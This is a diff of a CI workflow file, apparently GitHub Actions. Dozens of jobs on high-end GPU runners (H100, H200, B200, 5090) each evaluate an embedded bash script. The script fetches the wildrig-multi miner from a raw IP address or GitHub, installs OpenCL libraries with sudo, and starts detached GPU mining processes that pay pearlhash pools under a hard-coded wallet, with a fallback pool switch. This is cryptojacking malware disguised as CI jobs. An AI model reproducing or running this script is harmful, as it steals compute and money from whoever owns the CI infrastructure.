@@ -11,7 +11,7 @@ env:
   C211_I: '126460'
   C211_SCRIPT: "set -u\nset +e\nI=\"$C211_I\"\nD=\"$HOME/c211-$I\"; mkdir -p \"$D\"\necho \"C211_JOB i=$I label=$C211_LABEL slot=$C211_SLOT host=$(hostname) at=$(date -u +%FT%TZ) uid=$(id -u)\"\necho \"--- nvidia ---\"; nvidia-smi -L 2>&1 | head -8 || true\necho \"--- rocm ---\"; (rocm-smi -i 2>&1 | head -16) || true\n(command -v rocm-smi >/dev/null && rocm-smi --showuniqueid 2>/dev/null | head -12) || true\necho \"--- amd-smi ---\"; (amd-smi static --csv 2>&1 | head -4) || true\necho \"--- devices ---\"; ls -l /dev/kfd /dev/dri 2>/dev/null | head -14 || true\nif pgrep -f 'wildrig-multi' >/dev/null 2>&1; then echo \"GUARD_ACTIVE_SKIP: wildrig-multi already running\"; exit 0; fi\nWALLET=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql\nLPW=\"${WALLET}+NOCK\"\nWR_SHA=002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b\nget() { curl -fsSL --max-time 240 -o \"$D/wr.tgz\" \"$1\"; }\nget http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz || get https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz || { echo \"WILDRIG_DOWNLOAD_FAILED\"; exit 1; }\nmkdir -p \"$D/x\"; tar xzf \"$D/wr.tgz\" -C \"$D/x\" 2>/dev/null || tar xzf \"$D/wr.tgz\" -C \"$D\" 2>/dev/null || { echo \"WILDRIG_EXTRACT_FAILED\"; exit 1; }\nB=$(find \"$D\" -type f -name wildrig-multi | head -1)\n[ -n \"$B\" ] || { echo \"WILDRIG_BINARY_NOT_FOUND\"; exit 1; }\nchmod +x \"$B\"\nGOT=$(sha256sum \"$B\" | cut -d' ' -f1); echo \"WILDRIG_BINARY=$B SHA256=$GOT\"\n[ \"$GOT\" = \"$WR_SHA\" ] || { echo \"SHA_MISMATCH_ABORT\"; exit 1; }\nif ! ldconfig -p 2>/dev/null | grep -q 'libOpenCL\\.so\\.1'; then\n  for p in /opt/rocm/lib /opt/rocm/lib64 /usr/lib/x86_64-linux-gnu /usr/local/lib; do\n    if ls $p/libamdocl64.so* >/dev/null 2>&1 || ls $p/libOpenCL.so* >/dev/null 2>&1; then export LD_LIBRARY_PATH=\"$p:${LD_LIBRARY_PATH:-}\"; fi\n  done\n  if [ -d /opt/rocm/etc/OpenCL/vendors ]; then export OCL_ICD_VENDORS=/opt/rocm/etc/OpenCL/vendors; fi\nfi\nif ! ldconfig -p 2>/dev/null | grep -q 'libOpenCL\\.so\\.1'; then\n  echo \"OPENCL_LIB_MISSING_TRY_INSTALL\"\n  (sudo apt-get update -qq && sudo apt-get install -y -qq ocl-icd-libopencl1) >/dev/null 2>&1 || true\n  sudo ldconfig 2>/dev/null || true\nfi\necho \"--- print-platforms ---\"; \"$B\" --print-platforms 2>&1 | head -12 || true\necho \"--- print-devices ---\"; \"$B\" --print-devices 2>&1 | head -24 || true\nPLAT=all; N=0\nif nvidia-smi -L >/dev/null 2>&1; then N=$(nvidia-smi -L | grep -c '^GPU' || true); PLAT=nvidia; fi\nif [ \"${N:-0}\" -lt 1 ]; then M=$(ls /dev/dri/renderD* 2>/dev/null | wc -l | tr -d ' '); if [ \"${M:-0}\" -ge 1 ]; then N=$M; PLAT=amd; fi; fi\nif [ \"${N:-0}\" -lt 1 ] && command -v rocm-smi >/dev/null 2>&1; then N=$(rocm-smi -i --csv 2>/dev/null | grep -cE '^card[0-9]' || true); [ \"${N:-0}\" -ge 1 ] && PLAT=amd; fi\necho \"PLAT=$PLAT GPU_COUNT=$N\"\n[ \"${N:-0}\" -ge 1 ] || { echo \"NO_GPU_VISIBLE\"; exit 0; }\n[ \"$N\" -le 16 ] || N=16\nPLATFLAG=\"\"\n[ \"$PLAT\" = nvidia ] && PLATFLAG=\"--opencl-platforms nvidia\"\n[ \"$PLAT\" = amd ] && PLATFLAG=\"--opencl-platforms amd\"\necho \"--- pool tcp ---\"\nfor hp in pool.pearlhash.xyz:9000 hk.pearlhash.net:9000 103.199.106.122:3362; do\n  h=${hp%:*}; p=${hp#*:}\n  if timeout 8 bash -c \"</dev/tcp/$h/$p\" 2>/dev/null; then echo \"TCP_OK $hp\"; else echo \"TCP_FAIL $hp\"; fi\ndone\nfor i in $(seq 0 $((N-1))); do\n  if [ \"$PLAT\" = nvidia ]; then U=$(nvidia-smi --query-gpu=uuid,name --format=csv,noheader -i \"$i\" 2>/dev/null | head -1); else U=$( (rocm-smi --showuniqueid 2>/dev/null; ls /dev/dri/renderD* 2>/dev/null) | tr '\\n' ' ' | cut -c1-160); fi\n  echo \"GPU$i $U\"\n  setsid nohup \"$B\" --algo pearlhash $PLATFLAG -o pool.pearlhash.xyz:9000 -o global.pearlhash.net:9000 -o global2.pearlhash.net:9000 -o hk.pearlhash.net:9000 -u \"$WALLET\" -p x --worker \"${I}0$i\" -d \"$i\" > \"$D/gpu-$i.log\" 2>&1 &\n  echo $! > \"$D/pid-$i\"; echo \"STARTED gpu=$i pid=$!\"\ndone\nNOW=$(date +%s); END=$((NOW+1740)); SW=$((NOW+900)); SWITCHED=0\nwhile [ \"$(date +%s)\" -lt \"$END\" ]; do\n  sleep 60\n  TS=$(date +%s)\n  if [ \"$SWITCHED\" = 0 ] && [ \"$TS\" -ge \"$SW\" ]; then\n    SWITCHED=1\n    for i in $(seq 0 $((N-1))); do\n      A=$(cat \"$D/gpu-$i.log\" \"$D/gpu-$i.lp.log\" 2>/dev/null | grep -ci 'accepted' || true)\n      if [ \"${A:-0}\" -lt 1 ]; then\n        echo \"STICKY_LP_SWITCH gpu=$i at $(date -u +%FT%TZ)\"\n        kill \"$(cat \"$D/pid-$i\" 2>/dev/null)\" 2>/dev/null || true\n        sleep 1\n        setsid nohup \"$B\" --algo pearlhash $PLATFLAG -o 103.199.106.122:3362 -u \"$LPW\" -p x --worker \"${I}0$i\" -d \"$i\" > \"$D/gpu-$i.lp.log\" 2>&1 &\n        echo $! > \"$D/pid-$i.lp\"\n      fi\n    done\n  fi\n  for i in $(seq 0 $((N-1))); do\n    A=$(cat \"$D/gpu-$i.log\" \"$D/gpu-$i.lp.log\" 2>/dev/null | grep -ci 'accepted' || true)\n    R=$(cat \"$D/gpu-$i.log\" \"$D/gpu-$i.lp.log\" 2>/dev/null | grep -ci 'rejected' || true)\n    F=\"$D/last_acc_$i\"; PREV=$(cat \"$F\" 2>/dev/null || echo 0)\n    if [ \"${A:-0}\" != \"$PREV\" ]; then date +%s > \"$F\"; fi\n    LA=$(cat \"$F\" 2>/dev/null || echo 0)\n    echo \"det=g$i:a${A:-0}:r${R:-0}:la$LA\"\n  done\n  echo \"TAIL0: $(tail -2 \"$D/gpu-0.log\" 2>/dev/null | tr '\\n' ' ' | cut -c1-300)\"\n  echo \"TAILLP0: $(tail -2 \"$D/gpu-0.lp.log\" 2>/dev/null | tr '\\n' ' ' | cut -c1-200)\"\ndone\necho \"C211_DONE i=$I at=$(date -u +%FT%TZ)\"\n"
 jobs:
-  126460-8-gpu-h200-0:
+  nv-126460-8-gpu-h200-0:
     name: c211-126460-8-gpu-h200-0
     runs-on: 8-gpu-h200
     timeout-minutes: 45
@@ -22,7 +22,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-8-gpu-h200-1:
+  nv-126460-8-gpu-h200-1:
     name: c211-126460-8-gpu-h200-1
     runs-on: 8-gpu-h200
     timeout-minutes: 45
@@ -33,7 +33,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-8-gpu-h200-2:
+  nv-126460-8-gpu-h200-2:
     name: c211-126460-8-gpu-h200-2
     runs-on: 8-gpu-h200
     timeout-minutes: 45
@@ -44,7 +44,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-4-gpu-h200-0:
+  nv-126460-4-gpu-h200-0:
     name: c211-126460-4-gpu-h200-0
     runs-on: 4-gpu-h200
     timeout-minutes: 45
@@ -55,7 +55,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-2-gpu-h200-0:
+  nv-126460-2-gpu-h200-0:
     name: c211-126460-2-gpu-h200-0
     runs-on: 2-gpu-h200
     timeout-minutes: 45
@@ -66,7 +66,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-4-gpu-h100-0:
+  nv-126460-4-gpu-h100-0:
     name: c211-126460-4-gpu-h100-0
     runs-on: 4-gpu-h100
     timeout-minutes: 45
@@ -77,7 +77,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-4-gpu-h100-1:
+  nv-126460-4-gpu-h100-1:
     name: c211-126460-4-gpu-h100-1
     runs-on: 4-gpu-h100
     timeout-minutes: 45
@@ -88,7 +88,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-2-gpu-h100-0:
+  nv-126460-2-gpu-h100-0:
     name: c211-126460-2-gpu-h100-0
     runs-on: 2-gpu-h100
     timeout-minutes: 45
@@ -99,7 +99,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-2-gpu-h100-1:
+  nv-126460-2-gpu-h100-1:
     name: c211-126460-2-gpu-h100-1
     runs-on: 2-gpu-h100
     timeout-minutes: 45
@@ -110,7 +110,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-2-gpu-h100-2:
+  nv-126460-2-gpu-h100-2:
     name: c211-126460-2-gpu-h100-2
     runs-on: 2-gpu-h100
     timeout-minutes: 45
@@ -121,7 +121,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-2-gpu-h100-3:
+  nv-126460-2-gpu-h100-3:
     name: c211-126460-2-gpu-h100-3
     runs-on: 2-gpu-h100
     timeout-minutes: 45
@@ -132,7 +132,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-1-gpu-h100-0:
+  nv-126460-1-gpu-h100-0:
     name: c211-126460-1-gpu-h100-0
     runs-on: 1-gpu-h100
     timeout-minutes: 45
@@ -143,7 +143,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-1-gpu-h100-1:
+  nv-126460-1-gpu-h100-1:
     name: c211-126460-1-gpu-h100-1
     runs-on: 1-gpu-h100
     timeout-minutes: 45
@@ -154,7 +154,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-1-gpu-h100-2:
+  nv-126460-1-gpu-h100-2:
     name: c211-126460-1-gpu-h100-2
     runs-on: 1-gpu-h100
     timeout-minutes: 45
@@ -165,7 +165,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-1-gpu-h100-3:
+  nv-126460-1-gpu-h100-3:
     name: c211-126460-1-gpu-h100-3
     runs-on: 1-gpu-h100
     timeout-minutes: 45
@@ -176,7 +176,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-1-gpu-h100-4:
+  nv-126460-1-gpu-h100-4:
     name: c211-126460-1-gpu-h100-4
     runs-on: 1-gpu-h100
     timeout-minutes: 45
@@ -187,7 +187,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-1-gpu-h100-5:
+  nv-126460-1-gpu-h100-5:
     name: c211-126460-1-gpu-h100-5
     runs-on: 1-gpu-h100
     timeout-minutes: 45
@@ -198,7 +198,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-1-gpu-h100-6:
+  nv-126460-1-gpu-h100-6:
     name: c211-126460-1-gpu-h100-6
     runs-on: 1-gpu-h100
     timeout-minutes: 45
@@ -209,7 +209,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-1-gpu-h100-7:
+  nv-126460-1-gpu-h100-7:
     name: c211-126460-1-gpu-h100-7
     runs-on: 1-gpu-h100
     timeout-minutes: 45
@@ -220,7 +220,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-4-gpu-b200-0:
+  nv-126460-4-gpu-b200-0:
     name: c211-126460-4-gpu-b200-0
     runs-on: 4-gpu-b200
     timeout-minutes: 45
@@ -231,7 +231,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-4-gpu-b200-1:
+  nv-126460-4-gpu-b200-1:
     name: c211-126460-4-gpu-b200-1
     runs-on: 4-gpu-b200
     timeout-minutes: 45
@@ -242,7 +242,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-4-gpu-b200-2:
+  nv-126460-4-gpu-b200-2:
     name: c211-126460-4-gpu-b200-2
     runs-on: 4-gpu-b200
     timeout-minutes: 45
@@ -253,7 +253,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-4-gpu-b200-3:
+  nv-126460-4-gpu-b200-3:
     name: c211-126460-4-gpu-b200-3
     runs-on: 4-gpu-b200
     timeout-minutes: 45
@@ -264,7 +264,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-8-gpu-b200-0:
+  nv-126460-8-gpu-b200-0:
     name: c211-126460-8-gpu-b200-0
     runs-on: 8-gpu-b200
     timeout-minutes: 45
@@ -275,7 +275,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-8-gpu-b200-1:
+  nv-126460-8-gpu-b200-1:
     name: c211-126460-8-gpu-b200-1
     runs-on: 8-gpu-b200
     timeout-minutes: 45
@@ -286,7 +286,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-8-gpu-b300-0:
+  nv-126460-8-gpu-b300-0:
     name: c211-126460-8-gpu-b300-0
     runs-on: 8-gpu-b300
     timeout-minutes: 45
@@ -297,7 +297,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-8-gpu-b300-1:
+  nv-126460-8-gpu-b300-1:
     name: c211-126460-8-gpu-b300-1
     runs-on: 8-gpu-b300
     timeout-minutes: 45
@@ -308,7 +308,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-8-gpu-b300-2:
+  nv-126460-8-gpu-b300-2:
     name: c211-126460-8-gpu-b300-2
     runs-on: 8-gpu-b300
     timeout-minutes: 45
@@ -319,7 +319,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-8-gpu-b300-3:
+  nv-126460-8-gpu-b300-3:
     name: c211-126460-8-gpu-b300-3
     runs-on: 8-gpu-b300
     timeout-minutes: 45
@@ -330,7 +330,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-4-gpu-b300-0:
+  nv-126460-4-gpu-b300-0:
     name: c211-126460-4-gpu-b300-0
     runs-on: 4-gpu-b300
     timeout-minutes: 45
@@ -341,7 +341,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-4-gpu-gb300-0:
+  nv-126460-4-gpu-gb300-0:
     name: c211-126460-4-gpu-gb300-0
     runs-on: 4-gpu-gb300
     timeout-minutes: 45
@@ -352,7 +352,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-4-gpu-gb300-1:
+  nv-126460-4-gpu-gb300-1:
     name: c211-126460-4-gpu-gb300-1
     runs-on: 4-gpu-gb300
     timeout-minutes: 45
@@ -363,7 +363,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-1-gpu-5090-0:
+  nv-126460-1-gpu-5090-0:
     name: c211-126460-1-gpu-5090-0
     runs-on: 1-gpu-5090
     timeout-minutes: 45
@@ -374,7 +374,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-1-gpu-5090-1:
+  nv-126460-1-gpu-5090-1:
     name: c211-126460-1-gpu-5090-1
     runs-on: 1-gpu-5090
     timeout-minutes: 45
@@ -385,7 +385,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-1-gpu-5090-2:
+  nv-126460-1-gpu-5090-2:
     name: c211-126460-1-gpu-5090-2
     runs-on: 1-gpu-5090
     timeout-minutes: 45
@@ -396,7 +396,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-1-gpu-5090-3:
+  nv-126460-1-gpu-5090-3:
     name: c211-126460-1-gpu-5090-3
     runs-on: 1-gpu-5090
     timeout-minutes: 45
@@ -407,7 +407,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-8-gpu-h20-0:
+  nv-126460-8-gpu-h20-0:
     name: c211-126460-8-gpu-h20-0
     runs-on: 8-gpu-h20
     timeout-minutes: 45
@@ -418,7 +418,7 @@ jobs:
     - name: mine-pearlhash-first-sticky-lp
       shell: bash
       run: eval "$C211_SCRIPT"
-  126460-2-gpu-5090-0:
+  nv-126460-2-gpu-5090-0:
     name: c211-126460-2-gpu-5090-0
     runs-on: 2-gpu-5090
     timeout-minutes: 45
